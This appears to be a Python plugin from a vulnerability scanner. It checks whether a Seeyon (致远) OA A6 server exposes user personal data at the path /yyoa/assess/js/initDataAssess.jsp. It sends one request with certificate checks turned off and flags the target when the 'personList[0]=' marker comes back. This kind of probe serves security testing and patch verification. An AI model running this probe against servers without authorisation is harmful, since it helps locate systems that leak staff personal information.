#!/usr/bin/env python
# coding=utf-8
#致远OAA6initDataAssess.jsp用户敏感信息泄露
import requests, threading,base64
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        headers={
            'Upgrade-Insecure-Requests':'1',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
        }
        response = requests.get(url=url + '/yyoa/assess/js/initDataAssess.jsp',headers=headers,verify=False,timeout=20)
        if 'personList[0]=' in response.text:
            print(colored('[+]存在致远OAA6initDataAssess.jsp用户敏感信息泄露', 'red'))
            results = f'{url}-->存在致远OAA6initDataAssess.jsp用户敏感信息泄露'
        else:
            print('[-]不存在致远OAA6initDataAssess.jsp用户敏感信息泄露')
    except:
        print('[-]不存在致远OAA6initDataAssess.jsp用户敏感信息泄露')


def zhiyuanOAinitDataAssess(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

